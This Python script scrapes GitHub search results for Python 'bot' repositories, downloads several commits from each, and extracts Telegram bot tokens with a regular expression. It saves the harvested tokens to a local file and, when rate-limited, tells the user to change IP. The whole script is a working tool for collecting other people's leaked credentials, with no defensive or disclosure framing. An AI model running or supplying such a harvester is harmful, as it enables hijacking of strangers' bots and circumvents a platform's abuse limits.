import requests
from bs4 import BeautifulSoup
import re

# API limit: 
#  - UNAUTHENTICATED = 60 per hour per IP addr
#  - AUTHENTICATED = 1500 per hour

def save_tokens_to_file(token_set,file_path):
    with open(f"{file_path}", "a") as f:
        for t in token_set:
            f.write(f"{t}\n")
    print("saved")

def main(query):
    tg_tokens = set()

    r = requests.get(f"https://github.com/search?q=bot+language%3APython&type=repositories&s=updated&o=desc&l=Python")
    soup = BeautifulSoup(r.content, "html.parser")

    # extracts the repo owners and names from the html content
    repo_name_regex = re.compile(".*search-match.*")
    repo_elements = soup.find_all("span", {"class":repo_name_regex})
    repo_names = []
    # only if / is in the repo name as sometimes finds descriptions too
    for el in repo_elements:
        if "/" in el.text:
            repo_names.append(el.text)
    print(f"Found {len(repo_names)} repos.")
    
    repo_links = []
    for i in repo_names:
        try:
            owner,repo = i.split("/")
        except ValueError:
            print("Skipping repo with invalid title.")
            continue

        json = requests.get(f"https://api.github.com/repos/{owner}/{repo}").json()
        

        if "status" in json:
            if json["status"] == "404":
                print("Repo stopped existing. Skipping..")
                continue
        
        try:
            if "API rate limit" in json["message"]:
                print("Rate limit reached. Exiting...")
                quit()
        except KeyError:
            pass

        # get first 3 and last 3 commits
        commits_url = json["commits_url"]
        all_commits = requests.get(commits_url.replace("{/sha}", "")).json()
        print(f"Retrieved all commits for {owner}/{repo}")

        # if github repo is empty
        try:
            if "Git Repository is empty." in all_commits["message"]:
                print(f"{owner}/{repo} is empty. Skipping..")
                continue
        except TypeError:
            pass


        # if api rate limit exceeded
        if "message" in all_commits:
            if "API rate limit exceeded for" in all_commits["message"]:
                print("Api limit reached. Please change IP.")
                print(all_commits)
                break

        # sort all_commits json by most recent date to oldest date on a commit
        all_commits.sort(key=lambda x:x["commit"]["author"]["date"])


        # first 3, last 3
        commits_to_search = all_commits[:3] + all_commits[len(all_commits)-3:]

        # gets each commit, gets the html_url, then searches the html contents for 
        # telegram bot tokens

        for commit in commits_to_search:
            html_url = commit["html_url"]
            commit_content = requests.get(html_url).text
            tokens = re.findall(r"\d{10}:[A-Za-z0-9_-]{35,}", commit_content)
            print(tokens)
            if tokens:
                tg_tokens.update(tokens)
                print(f"Found {len(tokens)} in ")
            else:
                print(f"No tokens found in {owner}/{repo}")

    return tg_tokens


tokens = main("bot")
save_tokens_to_file(tokens, "output.txt")